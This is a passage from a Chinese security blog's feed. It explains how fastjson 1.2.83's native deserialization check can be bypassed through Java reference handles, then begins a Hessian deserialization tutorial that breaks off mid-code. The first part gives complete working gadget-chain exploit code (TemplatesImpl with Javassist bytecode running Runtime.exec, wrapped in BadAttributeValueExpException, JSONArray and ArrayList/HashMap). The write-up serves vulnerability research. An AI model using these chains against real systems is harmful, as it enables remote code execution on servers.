resolveClass<br></code></pre></td></tr></table></figure><p><strong>如何绕过</strong></p><p>那我们的绕过思路就是如果在中间的空档期做一些手脚，让他不进入到resolveClass里面</p><p>关键在ObjectInputStream#readObject0里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>他会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><p>在不同的case中，大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>然后分支中，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关也没什么用，那么就只剩下Reference引用类型了。</p><h2 id="引用类型利用"><a href="#引用类型利用" class="headerlink" title="引用类型利用"></a>引用类型利用</h2><p>我们需要在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查</p><p>方法就是向List、set、map类型中添加同样对象时即可成功利用</p><p><strong>原理分析</strong></p><p>分析代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们写入对象的时候会走到writeObject0这个方法</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>这里的注释翻译一下就是处理以前写入且不可替换的对象</p><p>然后走到ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>然后跟进去</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>这次传的是TemplatesImpl类，我们第一次写的时候他会在handles哈希表中建立映射</p><p>当我们再次写入的时候，他在查询的时候就不会返回-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>然后就可以进入到writeHandle方法里面</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>可以看到他将重复对象以引用类型写入，这样我们就可以绕过resolveClass的检查了</p><h2 id="利用链构造"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>文章的简单利用代码思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>文章的思路解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在handles这个hash表中查到了映射，后续则会以引用形式输出<br><br>反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过<br><br>Set、Map类型也是这样的绕过<br></code></pre></td></tr></table></figure><p>现在就可以写exp了，改成fastjson1.2.83版本来打</p><p>ArrayList的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>这里一开始我自己写直接简单粗暴arraylist加了两次，然后把arraylist放JSONArray里，导致打不通，后来一想都放里面的话有一个会不是引用类型，导致他经过resolveClass之后会提前抛出异常，所以我们无论是List还是Map，都是要包裹在外面的，使其第一个类反序列化的时候不经过resolveClass</p></blockquote><p>文章的HashMap的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-08T09:21:49.000Z</published>
    <updated>2024-10-10T14:57:50.438Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下Hessian反序列化，主要参考su18师傅的文章：</p><h1 id="hessian简介"><a href="#Hessian简介" class="headerlink" title="Hessian简介"></a>Hessian简介</h1><p>直接抄su18师傅里面的</p><p>Hessian 是 <a href="https://caucho.com/">caucho</a> 公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。</p><p>这是一种动态类型的<a href="http://hessian.caucho.com/doc/hessian-serialization.html">二进制序列化</a>和 <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web 服务</a>协议，专为面向对象的传输而设计。Hessian 协议在设计时，重点的几个目标包括了：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p><p>对于这样的设计，caucho 公司其实提供了两种解决方案，一个是 Hessian，一个是 Burlap。Hession 是基于二进制的实现，传输数据更小更快，而 Burlap 的消息是 XML 的，有更好的可读性。两种数据都是基于 HTTP 协议传输。</p><p>Hessian 本身作为 <a href="https://caucho.com/products/resin">Resin</a> 的一部分，但是它的 <code>com.caucho.hessian.client</code> 和 <code>com.caucho.hessian.server</code> 包不依赖于任何其他的 Resin 类，因此它也可以使用任何容器如 Tomcat 中，也可以使用在 EJB 中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p><p>作为一个二进制的序列化协议，Hessian 自行定义了一套自己的储存和还原数据的机制。对 8 种基础数据类型、3 种递归类型、ref 引用以及 Hessian 2.0 中的内部引用映射进行了相关定义。这样的设计使得 Hassian 可以进行跨语言跨平台的调用。</p><p>有关Hessian协议和其他协议的对比以及反序列化原理可以看这篇文章：<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><p>su18师傅的文章里面提供了多种使用方式，这里来复刻一下</p><h2 id="基于servlet"><a href="#基于Servlet" class="headerlink" title="基于Servlet"></a>基于Servlet</h2><p>定义一个方法接口</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端创建该方法的具体实现，并继承com.caucho.hessian.server.HessianServlet来将其标记为一个提供服务的Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后需要配置Servlet映射，我这里直接用了注解，也可以用web.xml来配置</p><p>Client 端通过 <code>com.caucho.hessian.client.HessianProxyFactory</code> 工厂类创建对接口的代理对象，并进行调用，可以看到调用后执行了服务端的逻辑并返回了结果。</p><blockquote><p>这一部分和RMI的远程调用类似，都是通过代理创建对象来执行方法的，等会分析源码的时候也会看到</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>这里Hessian并不需要像RMI那样接口的包名需要相同。</p><h2 id="基于spring"><a href="#基于Spring" class="headerlink" title="基于Spring"></a>基于Spring</h2><p>Spring-web 包内提供了 <code>org.springframework.remoting.caucho.HessianServiceExporter</code> 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问，因为 Spring 中间没有进行任何特殊处理。</p><p>从 spring-web-5.3 后，该类被标记为 <code>@Deprecated</code> ， 也就是说 spring 在逐渐淘汰对基于序列化的远程调用的相关支持。</p><blockquote><p>我这里一开始springboot3里面的spring-web是6.1.13的版本，是直接连HessianServiceExporter这个类也找不到了</p></blockquote><p>这里就不尝试了，copy一下官方文档的代码示例：<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是暴露服务的代码，客户端同样用前面的即可，只需要改一下url</p><p>他还有使用Burlap协议的写法</p><p>暴露服务：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>写法基本和使用hessian一致</p><h2 id="自封装调用"><a href="#自封装调用" class="headerlink" title="自封装调用"></a>自封装调用</h2><p>就是通过对 <code>HessianInput/HessianOutput</code>、<code>Hessian2Input/Hessian2Output</code>、<code>BurlapInput/BurlapOutput</code> 的相关方法的封装，可以自行实现传输、存储等逻辑，使用 Hessian 进行序列化和反序列化数据。</p><p>这里的Input和Output方法就是直接进行序列化和反序列化的方法，前面的调用也都是对这些方法进行了封装，Output就是序列化出去，Input就是反序列化</p><p>Input方法都继承自AbstractHessianInput这个抽象类</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Output方法则继承AbstractHessianOutput抽象类</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>这里封装成一个工具类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span 